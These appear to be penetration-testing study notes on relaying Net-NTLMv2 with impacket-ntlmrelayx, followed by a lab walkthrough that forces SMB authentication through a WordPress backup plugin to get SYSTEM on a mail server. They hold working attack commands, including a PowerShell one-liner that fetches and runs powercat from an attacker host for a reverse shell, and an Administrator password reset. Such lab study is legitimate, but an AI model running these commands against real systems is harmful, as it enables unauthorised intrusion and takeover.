- [[Responder]]
- [[Impacket]]
- [[SMB]]
### Relaying Net-NTLMv2
- - If not a local Admin user, UAC must be disabled

- impacket-ntlmrelayx
	- impacket library
	- sets up an SMB server and relays the authentification part
	- Example:
		- impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG5...."
			- --no-http-server = disable HTTP server since we're relaying SMB connection
			- -t = target
			- -c = command to execute
			- -enc = base64 encoded
			- [-i] = [interactive mode]
		- nc -lvnp 8080
			- catch reverse shell on SYS2
		- nc 192.168.50.211 5555
			- connect to bind shell on SYS1
		- dir \\192.168.119.2\test
			- create SMB connection to Kali machine
		- powershell reverse shell one liner
			- powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.145.245:8000/powercat.ps1');
powercat -c 192.168.45.245 -p 4444 -e powershell"

- or 
	- -c "net user Administrator Password123#"
- Scenario:

- In the previous section, we retrieved the plaintext password for _daniela_ and gained access to the WordPress dashboard on INTERNALSRV1. Let's review some of the settings and plugins.

Start:

- We'll begin with the configured users:
- Figure 20 shows _daniela_ is the only user. Next, let's check _Settings > General_.
- The _WordPress Address (URL)_ and _Site Address (URL)_ are DNS names as we assumed. All other settings in _Settings_ are mostly default values. Let's review the installed plugins next.
- Let's click on _Manage_, which brings us to the plugin configuration page. Clicking through the menus and settings, we discover the _Backup directory_ path.
    - Figure 23 shows that we can enter a path in this field, which will be used for storing the backup. We may abuse this functionality to force an authentication of the underlying system.
- Let's pause here for a moment and plan our next steps. At the moment, there are two promising attack vectors.
    1. The first is to upload a malicious WordPress plugin to INTERNALSRV1. By preparing and uploading a web shell or reverse shell, we may be able to obtain code execution on the underlying system.
    2. For the second attack vector, we have to review the BloodHound results again and make some assumptions. As we have discovered, the local _Administrator_ account has an active session on INTERNALSRV1. Based on this session, we can make the assumption that this user account is used to run the WordPress instance.
        - Furthermore, it's not uncommon that the local Administrator accounts across computers in a domain are set up with the same password. Let's assume this is true for the target environment.
        - We also learned that the domain administrator beccy has an active session on MAILSRV1 and therefore, the credentials of the user may be cached on the system.
        - Due to SMB signing being disabled on MAILSRV1 and INTERNALSRV1, a relay attack is possible if we can force an authentication.
        - Finally, we identified the Backup directory path field in the WordPress _Backup Migration_ plugin containing the path for the backup destination. This may allow us to force such an authentication request.

Plan:

- Based on all of this information, let's define a plan for the second attack vector. First, we'll attempt to force an authentication request by abusing the _Backup directory path_ of the Backup Migration WordPress plugin on INTERNALSRV1. By setting the destination path to our Kali machine, we can use **impacket-ntlmrelayx** to relay the incoming connection to MAILSRV1. If our assumptions are correct, the authentication request is made in the context of the local _Administrator_ account on INTERNALSRV1, which has the same password as the local _Administrator_ account on MAILSRV1.
- If this attack is successful, we'll obtain privileged code execution on MAILSRV1, which we can then leverage to extract the NTLM hash for beccy and therefore, meet one of the primary goals of the penetration test.

Start:

- Let's set up **impacket-ntlmrelayx** before we modify the _Backup directory path_ in the WordPress plugin. We'll use **--no-http-server** and **-smb2support** to disable the HTTP server and enable SMB2 support. We'll specify the external address for MAILSRV1, 192.168.50.242, as target for the relay attack. By entering the external address, we don't have to proxy our relay attack via Proxychains. Finally, we'll base64-encode a _PowerShell reverse shell oneliner_ that will connect back to our Kali machine on port 9999 and provide it as a command to **-c**.
    - `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 -c "powershell -enc JABjAGwAaQ..."`
- Set up a Netcat listener on port 9999 for the incoming reverse shell.
    - `nc -lvnp 9999`
- Now with everything set up, we can modify the Backup directory path.
    - Let's set the path to the _URI reference_ **//192.168.119.5/test** in which the IP is the address of our Kali machine and **test** is a nonexistent path.
- Success:
    - Listing 73 confirms the assumptions we made earlier. First, INTERNALSRV1/ADMINISTRATOR was used to perform the authentication. Second, by successfully authenticating to MAILSRV1, we confirmed that both machines use the same password for the local Administrator account.
    - The output also states that the relayed command on MAILSRV1 got executed. Let's check our Netcat listener for an incoming reverse shell.
        - `whoami;hostname`
- We successfully obtained code execution as NT AUTHORITY\SYSTEM by authenticating as a local Administrator on MAILSRV1 by relaying an authentication attempt from the WordPress plugin on INTERNALSRV1.